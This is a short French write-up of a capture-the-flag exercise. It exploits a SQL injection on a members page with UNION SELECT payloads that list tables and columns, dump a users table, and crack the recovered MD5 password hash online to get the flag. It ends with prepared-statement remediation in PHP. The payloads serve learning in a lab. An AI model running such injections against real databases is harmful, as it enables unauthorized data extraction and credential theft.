# Vulnérabilité

Sur la page membres, cette injection SQL basique nous permet de lister les tables SQL exsitantes:

`1=1 UNION SELECT table_name, table_schema FROM information_schema.tables;`

On trouve alors une table nommée `users` avec un schéma `Member_Sql_Injection`.

Ensuite on peut lister les colonnes de toutes les tables avec cette injection SQL:

`1=1 UNION SELECT table_name, column_name FROM information_schema.columns;`

On identifie alors 8 colonnes: `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire` et `countersign`.

Maintenant que nous avons toutes ces informations nous pouvons faire une requête SQL via injection pour récupérer toutes les informations que nous souhaitons sur la table.

`1=1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM Member_Sql_Injection.users;`

On retrouve le hash du mot de passe `5ff9d0165b4f92b14994e5c685cdce28` et en suivant les indications:

- On utlise https://md5decrypt.net/ pour décrypter le hash et on retrouve alors le mot de passe d'origine `FortyTwo`.
- Puis on le passe en miniscules pour obtenir `fortytwo`.
- Enfin on encrypte en SHA256 (https://md5decrypt.net/Sha256) et on obtient le flag.

# Solution

Pour se protéger de la faille, il faut utiliser des requêtes préparées.

__Exemple en PHP:__

```
// Avec PDO (https://www.php.net/manual/fr/pdo.prepare.php)

$stmt = $pdo->prepare('SELECT * FROM salaries WHERE prenom = :prenom');
$stmt->execute(array('prenom' => $prenom));

foreach ($stmt as $ligne) {
	// Traitement de la ligne de résultat
}
```